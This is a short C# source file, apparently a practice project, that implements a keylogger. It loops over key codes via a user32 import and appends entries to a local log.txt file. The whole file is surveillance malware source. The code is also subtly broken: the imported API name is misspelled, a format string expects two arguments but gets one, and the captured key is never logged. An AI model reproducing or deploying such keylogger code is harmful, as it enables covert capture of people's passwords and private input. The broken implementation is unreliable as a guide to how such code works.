using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Laboratory
{
    class Laboratory
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeysState(Int32 i);
        static void Main(string[] args)
        {
            // keylogger 

            StartLogging();


        }
        public static void StartLogging()
        {
            var filePath = @"log.txt";
            var writer = new StreamWriter(filePath);
            writer.AutoFlush = true;

            while (true)
            {
                Thread.Sleep(15);
                for (Int32 i = 0; i < 255; i++)
                {
                    var keyState = GetAsyncKeysState(i);

                    if (keyState == 1 || keyState == -32767)
                    {
                        var key = ((Keys)i).ToString();
                        writer.WriteLine(String.Format(" [{0}] - {1}", DateTime.Now));
                    }
                }
            }
        }
        
    }
}
